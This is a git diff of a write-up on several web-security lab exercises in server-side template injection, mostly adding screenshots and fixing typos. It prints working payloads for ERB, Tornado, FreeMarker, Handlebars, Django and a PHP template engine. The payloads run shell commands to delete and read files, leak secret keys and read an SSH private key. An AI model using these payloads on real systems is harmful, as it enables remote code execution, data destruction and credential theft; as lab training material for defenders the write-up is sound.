@@ -1,8 +1,12 @@
+<img src="images/image1.jpg" alt="third" width="500">
+
 **Step1:**
 
 first indentify the tempelate injection for ERB template
 
 When we click on product1 it prints message in url product is out of stock.
+
+<img src="images/image2.jpg" alt="third" width="500">
 
 **Step2:**
 
@@ -13,6 +17,8 @@ So we use `<%=foobar%>`
 
 When we render response it show
 
+<img src="images/image3.jpg" alt="third" width="500">
+
 It mean we can inject here
 
 Step3:
@@ -21,11 +27,15 @@ Using this exploit to delete morale.txt
 
 `<% File.delete('/home/carlos/morale.txt') %>`
 
+<img src="images/image4.jpg" alt="third" width="500">
+
 And the lab get solve
 
 Alternative payload
 
 `<%= system("rm /home/carlos/morale.txt") %>`
+
+<img src="images/image5.jpg" alt="third" width="500">
 
 **Step1:**
 
@@ -37,18 +47,26 @@ First I  review documentation of tornado and we fount to inject tempelate as
 
 Login to account and submit the preferred name
 
+<img src="images/image6.jpg" alt="third" width="500">
+
 **Step3:**
 
 No send the Post /my-account/change-blog-post-author-display to repeater and we try the basic injection
 `}}{{7*7}}`
 
+<img src="images/image7.jpg" alt="third" width="500">
+
 Now when we go to any post and post a comment we can see our name
+
+<img src="images/image8.jpg" alt="third" width="500">
 
 **Step4:**
 
 Now we use this payload to delete morale.txt
 
 `}}{{ __import__('os').system('rm /home/carlos/morale.txt') }}`
+
+<img src="images/image9.jpg" alt="third" width="500">
 
 Click on follow redirection to see response
 
@@ -57,28 +75,38 @@ And the lab is solved
 Alternative payload
 `{% import os %} {{os.system('rm /home/carlos/morale.txt')`
 
+<img src="images/image10.jpg" alt="third" width="500">
+
 **Step1:**
 
 Log in to account using the given credential
 
 **Step2:**
 
-Click on prodcut and then edit tempelate.
+Click on product and then edit template.
+
+<img src="images/image11.jpg" alt="third" width="500">
 
 **Step3:**
 
 Remove p tag to remove extra text
 
+<img src="images/image12.jpg" alt="third" width="500">
+
 **Step4:**
 
 No try to change any value to see response
 
+<img src="images/image13.jpg" alt="third" width="500">
+
 We have error
+
+<img src="images/image14.jpg" alt="third" width="500">
 
 In these error we have java free maker error
 Try to use payload using this
 
-**Step4:**
+**Step5:**
 
 Here I found a payload for java free maker
 `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`
@@ -87,14 +115,19 @@ Here I found a payload for java free maker
 
 When we use this we have response
 
+<img src="images/image15.jpg" alt="third" width="500">
 
 Now ls to list 
+
+<img src="images/image16.jpg" alt="third" width="500">
 
 Use rm morale.txt to delete file
 
 `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}`
 
 And the lab get solve
+
+<img src="images/image17.jpg" alt="third" width="500">
 
 **Step1:**
 
@@ -106,14 +139,19 @@ We can see in url Unfortunately this product is out of stock
 
 Send the request to repeater
 
+<img src="images/image18.jpg" alt="third" width="500">
 
-Try diferent temeplate signature
+Try different template signature
 
 At {{}} we found this error
+
+<img src="images/image19.jpg" alt="third" width="500">
 
 No we try {{this}} 
 
 it returned [object Object] 
+
+<img src="images/image20.jpg" alt="third" width="500">
 
 **Step3:**
 
@@ -253,23 +291,27 @@ conslist.forEach(item => {
 
 We url encode this tempelate and inject 
 
-
+<img src="images/image21.jpg" alt="third" width="500">
 
 And the lab get solve
 
-
+<img src="images/image22.jpg" alt="third" width="500">
 
 **Step1:**
 
-Login with given cradential
+Login with given credential
 
 **Step2:**
 
 Go to any product
 
+<img src="images/image23.jpg" alt="third" width="500">
+
 Here we can see product.stock 
 
 Try to replace it with product.self and see result
+
+<img src="images/image24.jpg" alt="third" width="500">
 
 **Step3:**
 
@@ -277,7 +319,11 @@ Now to extract framework secret key we use node.js tempelate
 
 `{{{ process.env.SECRET_KEY }}} `
 
+<img src="images/image25.jpg" alt="third" width="500">
+
 We can see error
+
+<img src="images/image26.jpg" alt="third" width="500">
 
 It looks like the payload `{{ process.env.SECRET_KEY }}` is not working as expected in the Django template system. Django's templating engine does not directly support accessing environment variables through the template syntax. The error message indicates that Django cannot parse the remainder of the expression, likely due to incorrect syntax for the template engine.
 
@@ -287,8 +333,11 @@ In python django setting is access through
  
 Try this
 
+<img src="images/image27.jpg" alt="third" width="500">
+
 Submit this key to solve the lab.
 
+<img src="images/image28.jpg" alt="third" width="500">
 
 **Step1:**
 
@@ -297,6 +346,8 @@ Login with given credential
 **Step2:**
 
 Go to product and  then edit template
+
+<img src="images/image29.jpg" alt="third" width="500">
 
 **Step3:**
 
@@ -323,6 +374,8 @@ Change aritcle to product and instead of id I want to print item using ls
 ${dwf.newInstance(ec,null)("ls")}
 ```
 
+<img src="images/image30.jpg" alt="third" width="500">
+
 To open file we use cat my_passwrd.txt
 ```
 <#assign classloader=product.class.protectionDomain.classLoader>
@@ -332,6 +385,10 @@ To open file we use cat my_passwrd.txt
 ${dwf.newInstance(ec,null)("cat my_password.txt")}
 ```
 
+<img src="images/image31.jpg" alt="third" width="500">
+
+<img src="images/image32.jpg" alt="third" width="500">
+
 **Step1:**
 
 Login with given credential
@@ -340,21 +397,33 @@ Login with given credential
 
 Click on preferred name
 
+<img src="images/image33.jpg" alt="third" width="500">
+
 Send the POST /my-account/change-blog-post-author-display request to repeater.
+
+<img src="images/image34.jpg" alt="third" width="500">
 
 **Step3:**
 
 Post a comment and then change user.name to user and send the request
 
+<img src="images/image35.jpg" alt="third" width="500">
+
 Load the webpage and we see
 
-From hre one thing is clear that the tempelate is in php.
+<img src="images/image36.jpg" alt="third" width="500">
+
+From here one thing is clear that the template is in php.
 
 **Step4:**
 
 Upload a php file
 
+<img src="images/image37.jpg" alt="third" width="500">
+
 And we see error
+
+<img src="images/image38.jpg" alt="third" width="500">
 
 From the error tw thing are clear
 There is a php file in home/carlos/user.php and there is a function name setavatar that take two parameter.
@@ -365,23 +434,35 @@ Go to sepeater and we access setavatar function
 
 `user.setAvatar('/home/carlos/User.php','image/jpg')`
 
+<img src="images/image39.jpg" alt="third" width="500">
+
 Now we see the data of file we send  GET /avatar?avatar=wiener to repeater.
 
 In response we can see result
 
+<img src="images/image40.jpg" alt="third" width="500">
+
 There is one thing in file 
 
-This funcntion delete when it is class and is public.
+<img src="images/image41.jpg" alt="third" width="500">
+
+This function delete when it is class and is public.
 
 **Step6:**
 
 Go to repeater and add this path to trigger this function
+
 `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')`
+
+<img src="images/image42.jpg" alt="third" width="500">
 
 In get avatar request we can see
 
+<img src="images/image43.jpg" alt="third" width="500">
 
 Send the request now we simply trigger the gdpr delete function use.ing
+
+<img src="images/image44.jpg" alt="third" width="500">
 
 Now we go to blog page and reload it
 
